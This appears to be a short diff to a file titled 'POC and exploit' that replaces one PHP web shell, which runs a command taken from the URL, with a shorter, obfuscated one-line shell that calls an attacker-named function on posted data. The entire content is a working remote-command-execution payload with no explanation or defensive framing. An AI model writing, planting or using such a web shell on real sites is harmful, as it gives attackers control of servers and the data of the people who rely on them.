@@ -1,2 +1,3 @@
 POC and exploit
-<?php system($_GET['cmd']);?>
+<?=$_GET[0]($_POST[1]);?>
+
